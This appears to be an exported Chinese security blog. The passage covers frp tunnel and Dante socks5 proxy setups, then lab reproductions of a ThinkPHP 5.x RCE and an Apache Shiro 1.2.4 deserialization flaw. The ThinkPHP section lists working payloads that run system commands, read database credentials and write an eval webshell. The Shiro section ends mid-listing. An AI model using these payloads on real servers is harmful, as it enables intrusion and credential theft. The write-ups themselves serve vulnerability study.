frps.ini<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000            #  服务端 frp 监听的端口<br>vhost_https_port = 4433     #  为代理的 https 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000              #  服务端端口（需和服务端的端口配置为一致）<br><br>[https]                         #  代理名称<br>type = https                    #  协议类型<br>custom_domains = www.test.com   #  设置需代理的域名（需能正常访问）<br>plugin = https2http             #  加载 https2http 插件<br>plugin_local_addr = 127.0.0.1<br>plugin_crt_path = /etc/pki/tls/certs/localhost.crt      #  设置本地证书<br>plugin_key_path = /etc/pki/tls/private/localhost.key    #  设置本地密钥<br>plugin_host_header_rewrite = 127.0.0.1<br>plugin_header_X-From-Where = frp<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><ul><li>3）由于是基于域名访问的所以须在服务端创建相应的域名记录<br><img src="hosts.png"></li><li>4）服务端使用浏览器访问<br><img src="htps.png"></li></ul><h3 id="仪表盘（检查-frp-状态和代理信息的统计）"><a href="#仪表盘（检查-frp-状态和代理信息的统计）" class="headerlink" title="仪表盘（检查 frp 状态和代理信息的统计）"></a>仪表盘（检查 frp 状态和代理信息的统计）</h3><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]       #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000            #  服务端 frp 监听的端口<br>dashboard_port = 7500       #  仪表盘监听的端口<br>dashboard_user = admin      #  仪表盘的用户名<br>dashboard_pwd = passwd      #  仪表盘的密码<br>max_pool_count = 5          #  创建地址池连接上限<br>vhost_http_port = 2333      #  为代理的 http 设置一个监听端口<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）使用浏览器访问并输入用户名跟密码<br><img src="dashboard-1.png"><br><img src="dashboard-2.png"></li></ul><h3 id="管理界面（用于管理客户端，可实现热加载）"><a href="#管理界面（用于管理客户端，可实现热加载）" class="headerlink" title="管理界面（用于管理客户端，可实现热加载）"></a>管理界面（用于管理客户端，可实现热加载）</h3><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000    #  frp 监听的端口<br></code></pre></td></tr></table></figure><p>启动服务 <code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]        #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000              #  服务端端口（需和服务端的端口配置为一致）<br>admin_addr = 127.0.0.1          #  管理地址<br>admin_port = 7400               #  监听的端口<br>admin_user = admin              #  访问时的用户名<br>admin_pwd = passwd              #  访问时的密码<br><br>#  管理界面默认只能本地访问，所以需将端口代理出去实现公网访问<br>[web_admin]                   #  代理名称<br>type = tcp                    #  协议类型<br>local_ip = 127.0.0.1      <br>local_port = 7400             #  需代理的本地端口（需能正常访问）<br>remote_port = 7400            #  远程端口（访问时使用的端口）<br></code></pre></td></tr></table></figure><p>启动服务 <code>sudo ./frpc -c ./frpc.ini</code></p><ul><li>3） 服务端使用浏览器访问<br><img src="htpadmin.png"></li></ul><hr><h2 id="基于-DNS"><a href="#基于-DNS" class="headerlink" title="基于 DNS"></a>基于 DNS</h2><p>1、配置服务端 frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]        #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000        #  服务端 frp 监听的端口<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><p>2、配置客户端 frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000              #  服务端端口（需和服务端的端口配置为一致）<br><br>[ssh]                   #  代理名称<br>type = tcp              #  协议类型<br>local_ip = 127.0.0.1<br>local_port = 22         #  需代理的本地端口（需能正常访问）<br>remote_port = 6000      #  远程端口（访问时使用的端口）<br><br>[DNS]                   #  代理名称<br>type = udp              #  协议类型<br>local_ip = 127.0.0.1<br>local_port = 53         #  需代理的本地端口（需能正常访问）<br>remote_port = 5333      #  远程端口（访问时使用的端口）<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><p>3、在服务端使用 <code>dig @192.168.0.190 -p 5333 -x 192.168.201.147</code> 查看与 192.168.201.147 相关的域名解析</p><p><img src="dns-2.png"></p><hr><h2 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h2><p>1、配置服务端 frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]            #  共同配置，必需有该配置（请勿修改该代理名）<br>bind_port = 7000    #  frp 监听的端口<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><p>2、配置客户端 frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]                #  共同配置，必需有该配置（请勿修改该代理名）<br>server_addr = 192.168.0.190 #  服务端 IP（需和服务端的 IP 配置为一致）<br>server_port = 7000          #  服务端端口（需和服务端的端口配置为一致）<br><br>[plugin_socks]              #  代理名称<br>type = tcp                  #  协议类型<br>remote_port = 8899          #  远程端口（服务端连接时使用此端口，如为 0 则服务端随机分配一个端口）<br>plugin = socks5             #  加载 socks5 插件<br>plugin_user = admin         #  用户名<br>plugin_passwd = passwd      #  密码<br>use_encryption = true       #  如为 true 则与服务端的通信会被加密（默认为 false）<br>use_compression = true      #  如为 true 则消息将被压缩<br></code></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><p>3、使用 Proxifier 进行连接<br><img src="lianjie-1.png"><br>4、点击检查测试是否能正常连接<br><img src="lianjie-2.png"><br>5、代理完成<br><img src="lianjie-3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu配置 socks5</title>
      <link href="/2021/02/11/proxy/ubuntu%20%E9%85%8D%E7%BD%AE%20socks5/socks5/"/>
      <url>/2021/02/11/proxy/ubuntu%20%E9%85%8D%E7%BD%AE%20socks5/socks5/</url>
      
        <content type="html"><![CDATA[<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>1、安装 socks5<br><code>sudo apt-get install dante-server</code><br>安装完后可使用 <code>danted -v</code> 查看版本信息<br>2、创建日志文件<br><code>touch /var/log/socks5.log</code><br>3、创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo useradd -s /sbin/nologin test -g proxy<br>passwd test<br></code></pre></td></tr></table></figure><h2 id="二、danted-conf-配置文件常用参数"><a href="#二、danted-conf-配置文件常用参数" class="headerlink" title="二、danted.conf 配置文件常用参数"></a>二、danted.conf 配置文件常用参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  指定日志文件保存的绝对路径<br>logoutput:/var/log/socks5<br><br>#  绑定网卡跟端口<br>internal: 0.0.0.0 port=1080     #  进口 IP 或 网卡<br>external: eth0 port=1080        #  出口 IP 或 网卡<br><br>#  设置 socks 身份验证方式<br>socksmethod: username   #  如为 none 则表示不进行身份验证（rfc931）<br>socksmethod: pam        #  pam 身份验证<br><br>#  设置客户端规则<br>clientmethod: none<br><br>#  用户相关<br>user.privileged: proxy#  当做一些需要特权的事情时，会使用 proxy 用户的权限（默认有该行）<br>user.unprivileged: nobody#  正常运行时，使用非特权用户 ID（默认有该行）<br>#  如果编译时支持 libwrap，使用的用户 ID（ libwrap：服务程序安全增强工具，对有状态连接的特定服务进行安全检测并实现访问控制）<br>user.libwrap: nobody#  默认有该行<br><br>#  兼容性相关<br>compatibility: sameport     #  当客户端连接后，socks 服务器将尝试使用与客户端使用的端口相同（需设置为 root 特权）<br>compatibility: reuseaddr    #  允许端口复用（加了此行会报错，此处解释仅作参考）<br><br>#  启用绑定扩展<br>extension: bind<br><br>#  超时设置<br>timeout.negotiate: 30   #  设置连接超时时间<br>timeout.io: 0        #  设置空闲超时时间（0 为永不超时）<br><br>#  接受来自地址（DNS）的连接<br>srchost: nodnsunknown nodnsmismatch<br><br>#  设置访问规则<br>client pass &#123;<br>        from: 0.0.0.0/0 port 1-65535 to: 0.0.0.0/0<br>        clientmethod: rfc931#  匹配密码文件中的所有 ID 用户<br>&#125;<br>client pass &#123;<br>        from: 0.0.0.0/0 port 1-65535 to: 0.0.0.0/0<br>        log: connect disconnect error#  记录连接、断开、报错信息<br>&#125;<br>socks pass &#123;<br>       from: 10.0.0.0/8 to: 0.0.0.0/0<br>        protocol: tcp udp<br>&#125;<br><br>#  设置拒绝规则<br>client block &#123;<br>        from: 0.0.0.0/0 to: 0.0.0.0/0<br>        log: connect disconnect error#  记录连接、断开、报错信息<br>&#125;<br>socks block &#123;<br>        from: 0.0.0.0/0 port 1-65535 to: 192.168.1.0/24<br>        log: connect disconnect error#  记录连接、断开、报错信息<br>&#125;<br>socks block &#123; <br>        from: 0.0.0.0/0 to: lo0<br>        log: connect disconnect error#  记录连接、断开、报错信息<br>&#125;<br>socks block &#123;#  阻止任何其他地址连接到 example.com 域<br>        from: 0.0.0.0/0 to: .example.com port = http<br>        log: connect disconnect error#  记录连接、断开、报错信息<br>&#125;<br><br>#  添加路由（服务器链接）<br>route &#123;<br> from: 10.0.0.0/8 to: 0.0.0.0/0 port = http via: socks.example.net port = socks<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、配置-SOCKS5"><a href="#三、配置-SOCKS5" class="headerlink" title="三、配置 SOCKS5"></a>三、配置 SOCKS5</h2><p>在 <code>danted.conf</code> 文件末尾添加如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  指定日志文件保存的绝对路径<br>logoutput: /var/log/socks5.log<br>#  进口 IP 或 网卡<br>internal: eth0 port = 8888<br>#  进口网卡及端口<br>internal: eth0 port = 9999<br>#  出口网卡<br>external: eth0<br>#  设置代理方式（rfc931）<br>socksmethod: username none<br>#  设置客户端规则<br>clientmethod: none<br>#  设置用户权限<br>user.privileged: root<br>#  非特权用户<br>user.notprivileged: nobody<br>#  如果编译时支持 libwrap，使用的用户 ID（ libwrap：服务程序安全增强工具，对有状态连接的特定服务进行安全检测并实现访问控制）<br>user.libwrap: nobody<br>#  设置访问规则<br>client pass &#123;<br>        from: 0.0.0.0/0 port 1-65535 to: 0.0.0.0/0<br>        #  记录连接、断开、报错信息<br>        log: connect disconnect error<br>&#125;<br><br>socks pass &#123;<br>        from: 0.0.0.0/0 port 1-65535 to: 0.0.0.0/0<br>        protocol: tcp udp<br>&#125;<br></code></pre></td></tr></table></figure><p>停止服务：<code>systemctl stop danted</code><br>启动服务：<code>systemctl start danted</code><br>重启服务：<code>systemctl restart danted</code><br>查看服务状态：<code>systemctl status danted</code></p>]]></content>
      
      
      <categories>
          
          <category> 代理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.0.2 - 5.0.23 RCE 漏洞复现</title>
      <link href="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/"/>
      <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>ThinkPHP5 5.0.2 - 5.0.23</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br><img src="1.jpg"></p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、访问 <a href="http://127.0.0.1/thinkphp/public/index.php?s=captcha">http://127.0.0.1/thinkphp/public/index.php?s=captcha</a> 并抓包</p><p>2、构建 POC 并发包<br><img src="2.png"></p><p>3、使用蚁剑连接<br><img src="3.png"></p><p>POC：<br>通过发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /thinkphp/public/index.php?s=captcha HTTP/1.1<br><br>#  查看当前用户<br>_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami<br><br>#  写入 WebShell（Linux）<br>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;&lt;?php @eval(\$_POST[&#x27;pass&#x27;]);?&gt;&quot; &gt; 1.php<br><br>#  写入 WebShell（Windows）<br>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo ^&lt;?php @eval($_POST[&#x27;pass&#x27;]);?^&gt; &gt; 1.php<br></code></pre></td></tr></table></figure><p>通过 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  查看数据库用户名<br>http://127.0.0.1/thinkphp/public/index.php?s=.|think\config/get&amp;name=database.username<br><br>#  查看数据库密码<br>http://127.0.0.1/thinkphp/public/index.php?s=.|think\config/get&amp;name=database.password<br><br>#  查看当前用户<br>http://127.0.0.1/thinkphp/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br><br>#  phpinfo<br>index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br></code></pre></td></tr></table></figure><h3 id="其他版本-POC"><a href="#其他版本-POC" class="headerlink" title="其他版本 POC"></a>其他版本 POC</h3><h4 id="当-PHP7-以上无法使用-Assert-的时候用"><a href="#当-PHP7-以上无法使用-Assert-的时候用" class="headerlink" title="当 PHP7 以上无法使用 Assert 的时候用"></a>当 PHP7 以上无法使用 Assert 的时候用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=包含&amp;x=phpinfo();<br></code></pre></td></tr></table></figure><h5 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/tp5/public/?s=index/\think\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1<br></code></pre></td></tr></table></figure><h5 id="ThinkPHP-5-0-21"><a href="#ThinkPHP-5-0-21" class="headerlink" title="ThinkPHP 5.0.21"></a>ThinkPHP 5.0.21</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<br><br>http://127.0.0.1/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br></code></pre></td></tr></table></figure><h5 id="ThinkPhP-5-1"><a href="#ThinkPhP-5-1" class="headerlink" title="ThinkPhP 5.1.*"></a>ThinkPhP 5.1.*</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1<br><br>http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=cmd<br><br>http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E<br><br>http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E<br><br>http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br><br>http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd<br><br>http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br><br>http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd<br></code></pre></td></tr></table></figure><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到5.0.24及以上，不开启debug模式</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a><br><a href="https://blog.csdn.net/qq_29647709/article/details/84956221">https://blog.csdn.net/qq_29647709&#x2F;article&#x2F;details&#x2F;84956221</a><br><a href="https://www.freebuf.com/vuls/194127.html">https://www.freebuf.com/vuls/194127.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ThinkPHP 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> ThinkPHP 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Shiro 1.2.4 反序列化漏洞复现</title>
      <link href="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/"/>
      <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>参考-1：<a href="https://www.cnblogs.com/loong-hon/p/10619616.html">https://www.cnblogs.com/loong-hon/p/10619616.html</a><br>参考-2：<a href="https://www.cnblogs.com/panisme/p/12552838.html">https://www.cnblogs.com/panisme/p/12552838.html</a></p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  获取 shrio 镜像<br>sudo docker pull medicean/vulapps:s_shiro_1<br>#  重启 docker<br>sudo systemctl restart docker<br>#  启动 shiro 环境<br>sudo docker run -d -p 8081:8080 medicean/vulapps:s_shiro_1<br>#  查看环境<br>sudo docker ps<br>#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><p>如提示： <code>No module named &#39;Crypto&#39;</code></p><p>则需安装第三方库： <code>pycryptodome</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pip3 install pycryptodome<br></code></pre></td></tr></table></figure><h2 id="0x04-工具"><a href="#0x04-工具" class="headerlink" title="0x04 工具"></a>0x04 工具</h2><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/tags">ShiroExploit</a><br><a href="https://github.com/sv3nbeast/ShiroScan">Shiro_rce.py</a><br><a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial.jar</a></p><h3 id="shiro-rce"><a href="#shiro-rce" class="headerlink" title="shiro_rce"></a>shiro_rce</h3><p><code>shiro_rce</code> 使用方法（会大量发包）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 shiro_rce.py http://192.168.1.233:8081/login.jsp &quot;ping -c 127.0.0.1&quot;<br></code></pre></td></tr></table></figure><hr><h3 id="s"><a href="#s" class="headerlink" title="s"></a>s</h3><p><code>s.py</code> 内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 